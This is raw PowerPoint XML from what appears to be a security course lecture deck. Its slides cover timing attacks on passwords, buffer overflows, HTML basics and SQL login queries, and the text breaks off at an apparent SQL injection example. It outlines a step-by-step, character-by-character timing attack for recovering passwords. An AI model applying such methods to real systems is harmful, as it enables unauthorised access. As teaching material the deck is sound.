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4"/>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8" r:id="rId18"/>
    <p:sldId id="279" r:id="rId19"/>
    <p:sldId id="283" r:id="rId20"/>
    <p:sldId id="284" r:id="rId21"/>
    <p:sldId id="285" r:id="rId22"/>
    <p:sldId id="287" r:id="rId23"/>
    <p:sldId id="329" r:id="rId24"/>
    <p:sldId id="331" r:id="rId25"/>
    <p:sldId id="330" r:id="rId26"/>
    <p:sldId id="332" r:id="rId27"/>
    <p:sldId id="333" r:id="rId28"/>
    <p:sldId id="334" r:id="rId29"/>
    <p:sldId id="335" r:id="rId30"/>
    <p:sldId id="338" r:id="rId31"/>
    <p:sldId id="339" r:id="rId32"/>
    <p:sldId id="340" r:id="rId33"/>
    <p:sldId id="336" r:id="rId34"/>
    <p:sldId id="337" r:id="rId35"/>
    <p:sldId id="341" r:id="rId36"/>
    <p:sldId id="342" r:id="rId37"/>
    <p:sldId id="344" r:id="rId38"/>
    <p:sldId id="345" r:id="rId39"/>
    <p:sldId id="286" r:id="rId40"/>
    <p:sldId id="288" r:id="rId41"/>
    <p:sldId id="289" r:id="rId42"/>
    <p:sldId id="290" r:id="rId43"/>
    <p:sldId id="291" r:id="rId44"/>
    <p:sldId id="292" r:id="rId45"/>
    <p:sldId id="293" r:id="rId46"/>
    <p:sldId id="294" r:id="rId47"/>
    <p:sldId id="296" r:id="rId48"/>
    <p:sldId id="297" r:id="rId49"/>
    <p:sldId id="298" r:id="rId50"/>
    <p:sldId id="299" r:id="rId51"/>
    <p:sldId id="300" r:id="rId52"/>
    <p:sldId id="304" r:id="rId53"/>
    <p:sldId id="305" r:id="rId54"/>
    <p:sldId id="306" r:id="rId55"/>
    <p:sldId id="324" r:id="rId56"/>
    <p:sldId id="307" r:id="rId57"/>
    <p:sldId id="308" r:id="rId58"/>
    <p:sldId id="311" r:id="rId59"/>
    <p:sldId id="347" r:id="rId60"/>
    <p:sldId id="348" r:id="rId61"/>
    <p:sldId id="312" r:id="rId62"/>
    <p:sldId id="325" r:id="rId63"/>
    <p:sldId id="313" r:id="rId64"/>
    <p:sldId id="314" r:id="rId65"/>
    <p:sldId id="315" r:id="rId66"/>
    <p:sldId id="316" r:id="rId67"/>
    <p:sldId id="317" r:id="rId68"/>
    <p:sldId id="318" r:id="rId69"/>
    <p:sldId id="319" r:id="rId70"/>
    <p:sldId id="326" r:id="rId71"/>
    <p:sldId id="349" r:id="rId72"/>
    <p:sldId id="381" r:id="rId73"/>
    <p:sldId id="380" r:id="rId74"/>
    <p:sldId id="355" r:id="rId75"/>
    <p:sldId id="356" r:id="rId76"/>
    <p:sldId id="357" r:id="rId77"/>
    <p:sldId id="358" r:id="rId78"/>
    <p:sldId id="359" r:id="rId79"/>
    <p:sldId id="361" r:id="rId80"/>
    <p:sldId id="360" r:id="rId81"/>
    <p:sldId id="362" r:id="rId82"/>
    <p:sldId id="363" r:id="rId83"/>
    <p:sldId id="364" r:id="rId84"/>
    <p:sldId id="365" r:id="rId85"/>
    <p:sldId id="366" r:id="rId86"/>
    <p:sldId id="367" r:id="rId87"/>
    <p:sldId id="368" r:id="rId88"/>
    <p:sldId id="369" r:id="rId89"/>
    <p:sldId id="370" r:id="rId90"/>
    <p:sldId id="377" r:id="rId91"/>
    <p:sldId id="378" r:id="rId92"/>
    <p:sldId id="379" r:id="rId93"/>
    <p:sldId id="382" r:id="rId94"/>
    <p:sldId id="383" r:id="rId95"/>
    <p:sldId id="384" r:id="rId96"/>
    <p:sldId id="385" r:id="rId97"/>
    <p:sldId id="386" r:id="rId98"/>
    <p:sldId id="387" r:id="rId99"/>
    <p:sldId id="388" r:id="rId100"/>
    <p:sldId id="389" r:id="rId101"/>
    <p:sldId id="390" r:id="rId102"/>
    <p:sldId id="391" r:id="rId103"/>
    <p:sldId id="392" r:id="rId104"/>
    <p:sldId id="393" r:id="rId105"/>
    <p:sldId id="394" r:id="rId106"/>
    <p:sldId id="395" r:id="rId107"/>
    <p:sldId id="396" r:id="rId108"/>
    <p:sldId id="398" r:id="rId109"/>
    <p:sldId id="399" r:id="rId110"/>
    <p:sldId id="400" r:id="rId111"/>
    <p:sldId id="402" r:id="rId112"/>
    <p:sldId id="403" r:id="rId113"/>
    <p:sldId id="404" r:id="rId114"/>
    <p:sldId id="406" r:id="rId115"/>
    <p:sldId id="407" r:id="rId116"/>
    <p:sldId id="408" r:id="rId117"/>
    <p:sldId id="371" r:id="rId118"/>
    <p:sldId id="372" r:id="rId119"/>
    <p:sldId id="373" r:id="rId120"/>
    <p:sldId id="374" r:id="rId121"/>
    <p:sldId id="375" r:id="rId122"/>
    <p:sldId id="376" r:id="rId1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83580" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="88" d="100"/>
          <a:sy n="88" d="100"/>
        </p:scale>
        <p:origin x="223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6B3843-6ACA-7B40-89CA-D68065E5D983}" type="datetimeFigureOut">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>10/3/2022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9CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="387043875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an</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> example of Tuna logs </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>and an example of URL request with injection attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{DC7FE783-A562-0045-AC02-5C864EF5593B}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3711356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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>			Timing Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="alphaUcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Create a string of length 11. For the char in position 0, try all chars and measure the running-time/response-time/CPU-cycles of the program. Select the one that consumes longest time as the char in position 0 of password. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="alphaUcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Append one char to the string from Step “A”. For the char in position 1, follow step “A” for position 1. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="alphaUcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>……..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>How many times do you need to try to figure out the password? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>26 + 26 + … 26 =&gt; 26 * 11 </a:t>
            </a:r>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6</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="158249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dirty="0"/>
              <a:t>The overwritten data may include:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Other buffers or variables =&gt; incorrect computation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Program control information =&gt;  program corruption or compromise. </a:t>
            </a:r>
          </a:p>
          <a:p>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Most common in C/C++ languages</a:t>
            </a:r>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8</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3378858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Ask students which</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="3600" baseline="0" dirty="0"/>
              <a:t> instructions will affect the stack? </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-TW" sz="3200" dirty="0"/>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15</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16</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17</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18</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19</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20</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21</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information can be found here</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>https://www3.ntu.edu.sg/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ehchua</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/programming/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>webprogramming</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>HTTP_Basics.html</a:t>
            </a:r>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24</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1654643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25</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3221262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&lt;HTML&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;HEAD&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;TITLE&gt;Your Title Here&lt;/TITLE&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;/HEAD&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;BODY BGCOLOR="FFFFFF"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;CENTER&gt;&lt;IMG SRC="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>clouds.jpg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>" ALIGN="BOTTOM"&gt; &lt;/CENTER&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;HR&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>="http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>somegreatsite.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>"&gt;Link Name&lt;/a&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>is a link to another nifty site</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;H1&gt;This is a Header&lt;/H1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;H2&gt;This is a Medium Header&lt;/H2&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Send me mail at &lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>href</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mailto:support@yourcompany.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>support@yourcompany.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;/a&gt;.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;P&gt; This is a new paragraph!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;P&gt; &lt;B&gt;This is a new paragraph!&lt;/B&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;BR&gt; &lt;B&gt;&lt;I&gt;This is a new sentence without a paragraph break, in bold italics.&lt;/I&gt;&lt;/B&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;HR&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;/BODY&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1200" kern="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>&lt;/HTML&gt;</a:t>
            </a:r>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31</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4157265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&lt;!DOCTYPE html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;h1&gt;My First Web Page&lt;/h1&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;p&gt;My first paragraph.&lt;/p&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>window.alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(5 + 6);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/html&gt; </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>32</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="790615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latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>timbo317</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>cse7330</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
              <a:latin typeface="Calisto MT" charset="0"/>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altLang="ja-JP" sz="1200" dirty="0">
              <a:latin typeface="Calisto MT"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altLang="ja-JP" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>Show the table, where </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
              <a:latin typeface="Calisto MT"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altLang="ja-JP" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>User</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1200" baseline="0" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> | pass</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" fontAlgn="auto" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
              <a:tabLst/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1200" baseline="0" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>David14 | CEG6400</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1200" dirty="0">
              <a:latin typeface="Calisto MT" charset="0"/>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latin typeface="Calisto MT" charset="0"/>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latin typeface="Calisto MT" charset="0"/>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47</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4089457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latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
